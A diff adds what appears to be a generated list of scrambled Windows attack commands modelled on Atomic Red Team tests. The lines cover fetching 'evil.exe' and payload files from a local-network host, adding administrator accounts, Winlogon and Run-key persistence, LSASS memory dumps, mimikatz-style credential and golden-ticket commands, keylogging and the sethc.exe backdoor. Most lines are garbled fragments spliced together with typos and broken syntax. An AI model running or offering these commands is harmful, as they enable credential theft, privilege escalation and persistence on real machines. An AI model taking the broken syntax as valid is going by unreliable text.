@@ -1,0 +1,64 @@
+copy c : shadow localappdata ) .downloadstring ( [ net.securityprotocoltype ] : //192.168.1.29:9000/payload/redirect.sdb -o )
+set-executionpolicy -executionpolicy bypass -scope localmachine -force
+reg add `` defaultaccount nt\currentversion\windows
+% localappdata % select-object windows ' administrators 5
+net user administrator /add
+gobuster dir -u $ { filename_regex }
+net user `` > '' '' @ `` hklm\system\currentcontrolset\services\winsock2\parameters '' `` $ filter ;
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword -class packages /add
+net user = `` `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword ;
+netstat
+bitsadmin.exe /create $ { output_zip_name } binpath=
+net user /add administrator
+dig /add
+`` : /for=c : administrators : '' c target = `` administrators '' '' c : \users\
+sekurlsa : :golden /user : $ t1547.009 nt\currentversion\winlogon\specialaccounts\userlist
+cmdkey.exe /list
+net user user = `` `` $ { user_name } ;
+net user = `` '' t1547.009 ; /y
+net user = @ ( `` % components\atomic_test '' )
+python -c `` hklm\software\microsoft\active //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+remove-item ( `` http : :securityprotocol = [ net.webclient ) \\ $ ( get-process ] : -- :securityprotocol = ' ffuf /out $ { shortcut.targetpath= } -u $ i -p $ i -count $ { user_name } \appdata\local\temp\lsass.dmp
+namp -sn -l $ { filename_regex }
+get-localgroup
+wlrmdr.exe -s $ { volumn file -filepath $ { flie_name } -f % setup\installed file shell.createshortcut ( `` keylog
+net user $ user = `` hklm\system\currentcontrolset\control\session t1547.009 . `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword
+python make_image.py $ } -o `` $ wscriptshell.createshortcut hklm\software\microsoft\windows nt\currentversion\image c : \windows\temp\dumpert.dmp
+bitsadmin.exe /create
+`` query user
+archive_file.exe $ : \users\
+net user administrator /add
+python -c `` kerberos : \system\currentcontrolset\services\winsock2\parameters -name atomic_red_team name = minidump ( get-process net.securityprotocoltype ] : :tls12
+reg add `` domain : administrators : @ :logonpasswords
+% localappdata % \microsoft\teams\current\teams.exe
+namp -sn $ { ip }
+quser
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v 1 /d `` 1 '' /f
+if ( new-object net.webclient ) \\ ( $ ( `` http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+net user = `` hkey_local_machine\software\microsoft\windows '' volumn file new-object -comobject } -arguments % wscript $ { parent_pid } '
+get-localgroupmember -group `` administrators '' -member `` volumn name file file '' /grant keylog
+wt.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net user /add $ { filename_regex }
+net group `` hklm\software\microsoft\active setup\installed components\atomic_test '' execution packages '' \windows\system32\sethc.exe
+import -r , keylog
+net shortcut = `` keylog
+namp -sn -d '' $ { filename_regex }
+get-ciminstance /set set currentprofile state off
+reg add `` hklm\software\microsoft\active nt\currentversion\winlogon\notify\atomicredteam '' ) ;
+$ shortcut = `` keylog
+net user administrator -p $ { output_zip_name } in $ { filename_regex }
+namp -sn $ { filename_regex }
+net user administrator -l `` $ { filter ; /user : \users\
+net user administrator /add
+net `` shortcut = `` shadow localappdata % \microsoft\teams\current\teams.exe windows
+tasklist
+quser
+net user = `` hklm\software\microsoft\windows t1547.009 . `` nt\currentversion\winlogon\notify\atomicredteam '' -name `` packages '' , `` $ { binary__file_path } ''
+reg delete $ shell.createshortcut : \users\ administrator
+for ( `` 7 tmp.run 0 monitorprocess name you create $ i . $ i -l : programdata\microsoft\windows\start @ `` hklm\software\microsoft\windows set-wmiinstance -namespace /r administrators : @ ( `` -sc $ filter ; c : //raw.githubusercontent.com/s3cur3th1ssh1t -command ( $ ( `` ( $ filter ; -u
+net user administrator /add
+gpresult /z
+/s : //192.168.1.29:9000/payload/redirect.sdb /y $ { hkey_current_user\control components\atomic_test '' ;
+nmap -o $ profile
+net `` hkcu\software\microsoft\windows\currentversion\run `` nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /f
+net user = `` `` nt\currentversion\winlogon\notify\atomicredteam '' '' /f
